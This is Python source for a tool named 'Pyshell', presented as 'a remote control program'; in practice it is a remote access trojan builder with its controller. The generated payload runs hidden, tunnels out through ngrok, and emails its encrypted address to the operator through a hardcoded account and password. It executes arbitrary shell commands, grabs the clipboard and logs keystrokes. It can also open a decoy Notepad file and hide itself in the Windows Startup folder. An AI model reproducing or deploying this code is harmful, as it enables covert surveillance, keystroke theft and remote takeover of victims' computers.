import socket
from cryptography.fernet import Fernet, InvalidToken
from base64 import urlsafe_b64encode
import os
from random import randint
import argparse


def mkexec(password:str, file:str, mail:str,auth_code:str, notepad = ('', ''), startup = False,  more_opt = ''):

    code = r'''from pyngrok import ngrok
from base64 import urlsafe_b64encode
import socket
from cryptography.fernet import Fernet
from subprocess import check_output, STDOUT, CalledProcessError
import _thread
import time

time.sleep(10)

def send_mail(mail):
    from email.message import EmailMessage
    import ssl
    import smtplib

    em = EmailMessage()

    em['from'] = 'sender34401@hotmail.com'
    em['to'] = "%s"
    em['subject'] = 'url'

    em.set_content(mail.decode())

    context = ssl.create_default_context()

    with smtplib.SMTP('smtp.office365.com', 587) as smtp:
        smtp.starttls(context=context)
        smtp.login(em['from'], 'HardPassword')
        smtp.sendmail(em['from'],em['to'], em.as_string())

def get_tunnel_detailes() -> dict:

    from requests import get

    url = 'http://127.0.0.1:4040'
    response = get(url)
    if response.status_code != 200:
        return get_tunnel_detailes()
    return ngrok.api_request("{}/api/tunnels".format(url), method="GET")["tunnels"][0]

%s

def r(soc:socket.socket):

        def dec(e:str):

            return Fernet(urlsafe_b64encode(pwd.ljust(32, '_').encode())).decrypt(e.encode())

        def enc(e:str):
            return Fernet(urlsafe_b64encode(pwd.ljust(32, '_').encode())).encrypt(e.encode())

        try:
            
            connection = get_tunnel_detailes()

            pwd = "%s"

            send_mail(enc(connection['public_url']))


            soc.listen(5)
            conn, addr = soc.accept()
        except Exception as e:
            return r(soc)
        

        while True:
            try:
                cmd = dec(conn.recv(1999).decode()).decode()
                output = check_output(cmd, shell=True, stderr=STDOUT)

                
                if output:
                    conn.send(enc(output.decode()))
                else:
                    conn.send(enc('command executed secssesfuly'))
            
            except CalledProcessError as e:
                if e.cmd == '@@q':

                    conn.send(enc('exited secssfully'))
                    break
                elif e.cmd == '@@gtclip':

                    conn.send(enc(check_output('powershell /c Get-Clipboard').decode()))

                elif e.cmd == '@@stmnkeys':

                    def on_type(key):
                        key = key.name
                        if key == 'enter':
                            conn.send(enc('\n'))
                        elif key == 'space':
                            conn.send(enc(' '))
                        elif key == 'tab':
                            conn.send(enc('\t'))
                        elif len(key) == 1:
                            conn.send(enc(key))
                        else:
                            conn.send(enc(''))

                    kbrd = keyboard
                    kbrd.on_press(on_type)
                    while True:
                        msg = dec(conn.recv(4000).decode()).decode()
                        if msg == 'stp':
                            conn.send(enc('\nstoped monitoring keys'))
                            kbrd.unhook_all()
                            break
                else:
                    conn.send(enc(f'\nerror while executing:\n{e.output.decode()}\n'))

            except Exception as e:
                if e == ConnectionAbortedError:
                    pass
                else:
                    conn.send(enc(f'\nerror:{e}\n'))


def m():
    try:
        if ngrok.os.getcwd() != f"C:\\Users\\{ngrok.os.getlogin()}\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup" and "open_notepad" in dir():
            open_notepad()
        
        global soc
        ngrok.installer._print_progress_enabled = False
        ngrok.conf.PyngrokConfig(monitor_thread=False, request_timeout=10000)


        soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        HOST = 'localhost'

        PORT = 234

        soc.bind((HOST, PORT))
        ngrok.sys.setrecursionlimit(1000000000)
        ngrok.set_auth_token('%s')

        _thread.start_new_thread(r, (soc,))

        check_output(f'"{ngrok.conf.DEFAULT_NGROK_PATH}" tcp 234', shell=True, stderr=STDOUT)
    except Exception as e:
        try:
            soc.close()
        except:
            pass
        return m()

while True:
    m()'''
    
    startup_code = '''ngrok.os.replace(ngrok.sys.executable,"C:\\Users\\{}\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\desini.exe".format(ngrok.os.getlogin()))
        check_output('attrib +h +s "C:\\Users\\{}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\desini.exe"'.format(ngrok.os.getlogin()))'''
    
    notepad_code = '''def open_notepad():
    try:
        detailes_for_file = """%s
"""
        %s
        with open('%s', 'w') as f:
            f.write(detailes_for_file)
        ngrok.os.popen(f'notepad.exe {ngrok.os.getcwd()}\\{ngrok.os.path.basename(ngrok.sys.executable)}')
    except:
        pass
 ''' %(notepad[0], notepad[1], startup_code if notepad != '' and startup else '')
    


    os.system('pip install pyinstaller')
    fileplace = 'C:\\Users\\{}\\AppData\\Local\\Temp\\pyshell-'.format(os.getlogin()) + str(randint(2000, 10000000))

    os.mkdir(fileplace)

    pyscript = code %(mail, notepad if notepad == '' else notepad_code ,password, auth_code)

    with open(fileplace + '\\script.py', 'w') as f:
        f.write(pyscript)

    os.system('pyinstaller --noconfirm --onefile --windowed --name "{file}" --clean "{fileplace}\\script.py" --distpath "{exe_path}" --workpath "{fileplace}\\workpath" --specpath "{fileplace}\\specpath" --hidden-import keyboard {more_opt}'.format(fileplace = fileplace, exe_path = os.getcwd() + '\\' + file, file=file, more_opt = more_opt))
    os.system(f'rd /s /q "{fileplace}"')

def conn(url:str, pswd:str):
    try:

        pswd = pswd.ljust(32, "_")

        def enc(e:str) -> bytes:
            return Fernet(urlsafe_b64encode(pswd.encode())).encrypt(e.encode())

        def dec(e:str) -> str:
            return Fernet(urlsafe_b64encode(pswd.encode())).decrypt(e.encode()).decode()

        url = dec(url)
    except InvalidToken as e:
        print('wrong password ' + str(e))
        return 

    url = url.split('//')[1]

    HOST, port = url.split(':')
    PORT = int(port)

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    cmd = ''

    s.connect((HOST, PORT))

    print('created connection')


    cmd = ''

    while cmd != '@@q':

        cmd = input('shell> ')

        if '@@exec' in cmd:
            os.system(cmd.partition('@@exec')[2])
            continue
        else:
            s.send(enc(cmd))
        
        if cmd == '@@stmnkeys':
            print('start monitoring keys press Ctrl+C to stop')
            while True:
                try:
                    s.send(enc('nxt'))
                    print(dec(s.recv(40000).decode()).decode(), end='', flush=True)
                except:
                    print('stopping monitoring keys...')
                    s.send(enc('stp'))
                    print(dec(s.recv(40000).decode()).decode())
                    break

        try:
            print(dec(s.recv(40000).decode()).decode())
        except InvalidToken:
            print(s.recv(40000))
def default():
    while True:
        command = input("please enter a valid command\n>").split(' ')

        def get_command(arg, must_have = True, if_not_exsists = False):
            if arg not in command and must_have:
                raise KeyError('you must have the argument: ' + arg)
            elif not must_have:
                return if_not_exsists
                
            return command[command.index(arg) + 1]
        try:
            if command[0] == "conn":

                conn(url = get_command('-u'), pswd= get_command('-p'))
                break
            elif command[0] == "mkexe":
                mkexec(file= get_command('-n'), mail=get_command('-m'), password=get_command('-p'),auth_code=get_command('-c'), notepad=get_command('-OpenN', False, '').partition(','), startup=get_command('--OnStr', False, False))
            elif command[0] == 'help':
                print(f'''
    conn: connect to a client

    [args]
    -u: the encrypted url - must have execute
    -p: password to decrypt the url - must have to execute


    mkexe: make executable

    [args]

    (must have)

    -n: the filename of the executable

    -m: the mail to send the encrypted url to

    -p: password to encrypt the url

    -a: api for the ngrok 
    (go to ngrok website: https://dashboard.ngrok.com/signup click on api and create an api key)

    (optional)

    --OpenN: shortage for open notepad;
    it will open notepad on what you will enter into it
    needed: file name for the txt file + the text inside it (file).
    example: --OpenN text,filename

    --OnStr: short for on startup;
    it will move the exe to shell:startup folder.
    workes only if --OpenN is toggled otherwize it will ignore it.
    no args needed.

    --Opt: has to be at the end, its adding additonal options to pyinstaller.

    ''')
            else:
                print(f'\nthe command:"{command[0]}" is not a valid command\n')
        except Exception as e:
            print(f'\n\n Error while executing command:\t{e}\n\n')

def create_arg(praser:argparse.ArgumentParser, arg_name:str, disc:str = '',  *args_for_arg, **specific_args:dict):

    praser.add_argument("--" + arg_name, metavar=args_for_arg, help=disc, nargs=len(args_for_arg))
    # for arg in args_for_arg:
    #     praser.add_argument(arg, action='store', help="used for " + arg_name)

    for name, arg in zip(specific_args, specific_args.items()):
        arg = arg[1]
        praser.add_argument(*('-' + name, '-' + name[0]),
                            **arg,
                            help='used for ' + arg_name
                            )

parser = argparse.ArgumentParser("Pyshell",
                                 "a remote control program",
                                """using a ngrok to create a tcp server and pyinstaller to compile the code.
                                   a very simple program made by OfekDH""")

parser.add_argument('-sh', '--shell', action="store_true", help='if you do not want to use command line you can use a shell')
# parser.add_argument('--mkexe', action='store_true', help='make the exe for the client')

mkexe_args = ('p', 'f', 'm', 'a')
conn_args = ('u', 'p')

create_arg(parser, "mkexe", 'make the exe for the client\n\n', *mkexe_args, startup = {'action':'store_true'}, notepad = {'action':'store', 'metavar':('file_name', 'txt_inside'), 'nargs':2, 'default':('','')}, opt={})
create_arg(parser, 'conn', 'connect to a client', *conn_args)

if '-h' in argparse._sys.argv :
    if '--mkexe' in argparse._sys.argv:
        print('''mkexe: make executable

    [args]

    (must have)

    n: the filename of the executable

    m: the mail to send the encrypted url to

    p: password to encrypt the url

    a: api for the ngrok 
    (go to ngrok website: https://dashboard.ngrok.com/signup click on api and create an api key)

    (optional)
    
    -n or -noatpad:
    it will open notepad on what you will enter into it
    needed: file name for the txt file + the text inside it (file).
    example: --OpenN text,filename.txt

    -startup:
    it will move the exe to shell:startup folder.
    no args needed.

    -opt:
    its adding additonal options to pyinstaller.''')
        exit(0)
    if '--conn' in argparse._sys.argv:
        print('''
        conn: connect to a client
        [args]
            u: the encrypted url
            p: the password to decrypt the url''')
        exit(0)
args = parser.parse_args()

if args.shell:
    default()
if args.mkexe:
    mkexec(*args.mkexe[:4], notepad=args.notepad, more_opt=args.opt, startup=args.startup)
if args.conn:
    conn(*args.conn)
